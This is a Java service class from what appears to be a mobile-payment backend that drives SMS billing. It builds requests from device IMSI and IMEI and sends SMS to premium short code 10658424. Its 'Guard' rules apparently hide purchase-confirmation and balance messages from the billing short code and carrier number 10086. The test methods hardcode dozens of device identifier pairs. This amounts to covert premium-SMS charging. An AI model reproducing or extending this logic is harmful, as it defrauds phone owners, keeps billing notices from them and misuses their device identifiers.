package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 强联网
 * http://42.121.115.156:9980/mmnet

HTTP  POST:
1、init
req:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetInitReq><MsgType>NetInitReq</MsgType><AppID>14001</AppID><Imsi></Imsi><Imei></Imei><UA></UA></NetInitReq>

response:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetInitResp><MsgType>NetInitResp</MsgType><Return>0</Return><Content>xxxxx</Content><Sid>1</Sid></NetInitResp>

2、confirm init
req:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetConfirmInitReq><MsgType>NetConfirmInitReq</MsgType><AppID>14001</AppID><Imsi></Imsi><Imei></Imei><UA></UA><Sid>1</Sid></NetConfirmInitReq>

response:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetConfirmInitResp><MsgType>NetConfirmInitResp</MsgType><Return>0</Return></NetConfirmInitResp>

3、pay
req:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetBillReq><MsgType>NetBillReq</MsgType><AppID>14001</AppID><PayCode>1</PayCode><Imsi></Imsi><Imei></Imei><UA></UA></NetBillReq>

response:
<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetBillResp><MsgType>NetBillResp</MsgType><Return>0</Return><TradeId></TradeId></NetBillResp>

 * 
 * @author leoliu
 *
 */
public class LxtxSmmDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(LxtxSmmDynamicService.class);
	
	private static final String TYPE = "lxtxSmm";
	
	private static final String PARAM1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetInitReq><MsgType>NetInitReq</MsgType><AppID>{appid}</AppID><Imsi>{imsi}</Imsi><Imei>{imei}</Imei><UA>Huawei</UA></NetInitReq>";
	private static final String PARAM2 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetConfirmInitReq><MsgType>NetConfirmInitReq</MsgType><AppID>{appid}</AppID><Imsi>{imsi}</Imsi><Imei>{imei}</Imei><UA>Huawei</UA><Sid>{sid}</Sid></NetConfirmInitReq>";
	private static final String PARAM3 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><NetBillReq><MsgType>NetBillReq</MsgType><AppID>{appid}</AppID><PayCode>{payCode}</PayCode><Imsi>{imsi}</Imsi><Imei>{imei}</Imei><UA>Huawei</UA></NetBillReq>";
	
	private static final String DEST = "10658424";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		String theNo = map.get("theNo");
		
		if("1".equals(theNo)){
			return firstDynamic(map);
		}else if("2".equals(theNo)){
			return secondDynamic(map);
		}else if("3".equals(theNo)){
			return thirdDynamic(map);
		}
		
		return null;
	}
	
	public String firstDynamic(Map<String, String> map) {
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appid = StringUtils.defaultString(map.get("appid"));
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			
			String param = PARAM1.replace("{appid}",appid).replace("{imsi}",imsi).replace("{imei}",imei);
			
			String responseXml = new PostData().PostData(param.getBytes(), url);
			
			xml = parseFirst(map,responseXml);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}

	private String parseFirst(Map<String, String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			logger.info("parse first : "+responseXml);
			
			String status = SingleXmlUtil.getNodeValue(responseXml, "Return");
			
			if("0".equals(status)){
				String content = SingleXmlUtil.getNodeValue(responseXml, "Content");
				
				if(content != null && content.length() > 10){
					
					Sms sms = new Sms();
					
					sms.setSmsContent(content);
					sms.setSmsDest(DEST);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					String sid = SingleXmlUtil.getNodeValue(responseXml, "Sid");
					
					Sets sets = new Sets();
					sets.setKey("sid");
					sets.setValue(sid);
					
					return XstreamHelper.toXml(sms).append(XstreamHelper.toXml(sets)).toString();
				}
			}else if("1".equals(status)){
				Sets sets = new Sets();
				sets.setKey("sid");
				sets.setValue("0");
				
				return XstreamHelper.toXml(sets).toString();
			}
		}
		
		return null;
	}
	
	private Map<String, Long> tryMap1 = new HashMap<String, Long>();
	
	private String secondDynamic(Map<String, String> map){
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String sid = map.get("sid");
			
			if("0".equals(sid)){
				return "<wait>1</wait>";
			}else{
				Calendar cal = Calendar.getInstance();
				Long startTime = tryMap1.get(sid);
				
				if(startTime == null){
					startTime = cal.getTimeInMillis();
					tryMap1.put(sid,startTime);
				}else{
					if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
						tryMap1.remove(sid);
						return DynamicUtils.parseError("599");
					}
				}
				
				String appid = StringUtils.defaultString(map.get("appid"));
				String imsi = StringUtils.defaultString(map.get("imsi"));
				String imei = StringUtils.defaultString(map.get("imei"));
				
				String param = PARAM2.replace("{appid}",appid).replace("{imsi}",imsi).replace("{imei}",imei).replace("{sid}",sid);
				
				String responseXml = new PostData().PostData(param.getBytes(), url);
				
				xml = parseSecond(map,responseXml);
				
				if(xml != null && xml.length() > 0){
					tryMap.remove(sid);
				}else{
					logger.info("responseXml is null");
					return DynamicUtils.parseWait(10,map);
				}
			}
			
		}
		
		return xml;
	}
	
	private String parseSecond(Map<String, String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			logger.info("parse second : "+responseXml);
			
			String Return = SingleXmlUtil.getNodeValue(responseXml, "Return");
			
			if("0".equals(Return)){
				return "<wait>1</wait>";
			}else{
				return DynamicUtils.parseError("597");
			}
		}
		
		return null;
	}
	
	private Map<String, Long> tryMap2 = new HashMap<String, Long>();
	
	private String thirdDynamic(Map<String, String> map){
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap2.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap2.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap2.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appid = StringUtils.defaultString(map.get("appid"));
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String payCode = StringUtils.defaultString(map.get("payCode"));
			
			String param = PARAM3.replace("{appid}",appid).replace("{payCode}",payCode).replace("{imsi}",imsi).replace("{imei}",imei);
			
			String responseXml = new PostData().PostData(param.getBytes(), url);
			
			xml = parseThird(map,responseXml);
			
			if(xml == null){
				xml = DynamicUtils.parseWait(7,map);
			}else{
				map.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseThird(Map<String, String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			logger.info("parse third : "+responseXml);
			
			String Return = SingleXmlUtil.getNodeValue(responseXml, "Return");
			
			if("0".equals(Return)){
				Sms sms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				guardList.add(guard1);
				guardList.add(guard2);
				guardList.add(guard3);
				guardList.add(guard4);
				
				sms.setGuardList(guardList);
				
				return XstreamHelper.toXml(sms).toString();
			}else{
				return DynamicUtils.parseError("596");
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		test3();
	}
	
	private static void test11(){
		String imeis = "865056028842306,352911063702650,865039020467223,865323022115950,866550023129403,864030021873569,866330024342242,866641021730902,860281021552596,906947064418947,864620025191644,356524052418596,864147026874358,357360050404422,864182022568589,865267027764132,866092026377762,865488022021332,865335023401254,359627053530694,351888060981258,351858058408978,861362024538276,357466020058931,868522000178024,863715020142989,863990026826642,351794063299310,864398021864999,864709021164521";
		String imsis = "460003866128235,460021233469014,460007050427725,460026611230990,460009592666072,460079996802792,460000732536241,460021914476918,460029347796268,460006540744089,460007072186012,460026764128446,460002073230172,460000360722944,460028674759085,460029174035489,460003837172703,460009373848370,460027020584708,460029524055032,460027385320842,460029037311655,460007814820062,460004434972412,460028332608746,460009742697629,460022992135661,460000165946046,460021701909724,460078246343403";
		
		String[] imeiArr = imeis.split(",");
		String[] imsiArr = imsis.split(",");
		
		for(int i = 0 ; i < imeiArr.length ; i ++){
			String imei = imeiArr[i];
			String imsi = imsiArr[i];
			
			Map<String, String> map = new HashMap<String, String>();
			
			map.put("url", "http://119.29.52.164:9980/mmnet");
			map.put("channel", "106208a001001001");
			map.put("appid", "5151003");
			map.put("imei",imei);
			map.put("imsi", imsi);
			map.put("theNo","1");	
			
			String xml = new LxtxSmmDynamicService().dynamic(map);
			
			logger.info(xml);
			
			try {
				Thread.sleep(1000*2);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://119.29.52.164:9980/mmnet");
		map.put("channel", "106208a001001001");
		map.put("appid", "5151005");
		map.put("imei","869460011780372");
		map.put("imsi", "460022101441340");
		map.put("theNo","1");	
		
		String xml = new LxtxSmmDynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://119.29.52.164:9980/mmnet");
		map.put("appid", "5151005");
		map.put("imei","869460011780372");
		map.put("imsi", "460022101441340");
		map.put("theNo","2");
		map.put("sid", "177485695");
		
		String xml = new LxtxSmmDynamicService().dynamic(map);
		
		logger.info(xml);
		
	}
	
	private static void test3(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://119.29.52.164:9980/mmnet");
		map.put("channel", "106208a001001002");
		map.put("appid", "5151005");
		map.put("payCode","1");
		map.put("imei","869460011780372");
		map.put("imsi", "460022101441340");
		map.put("theNo","3");		
		
		String xml = new LxtxSmmDynamicService().dynamic(map);
		
		logger.info(xml);
	}
}
